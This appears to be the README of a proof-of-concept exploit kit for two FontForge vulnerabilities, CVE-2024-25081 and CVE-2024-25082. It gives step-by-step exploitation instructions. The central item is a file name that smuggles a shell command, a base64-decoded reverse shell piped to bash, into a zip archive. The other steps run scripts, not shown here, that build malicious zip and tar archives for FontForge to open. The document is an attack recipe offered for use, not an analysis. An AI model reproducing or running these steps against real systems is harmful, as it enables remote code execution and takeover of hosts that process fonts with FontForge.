# CVE-2024-25081

Exploitation: 

1. create a file that will be zipped when executing CVE-2024-25081.py

``` touch '$(echo BASE64_ENCODED_REVSHELL|base64 -d|bash).ttf' ```

2. Create Malicious zip and transfer it to where fontforge open() the files from.

``` python3 CVE-2024-25081.py ```

# CVE-2024-25082

Exploitation:

Create Malicious tar file and transfer it to where fontforge open() the files from.

``` python3 CVE-2024-25082.py ```
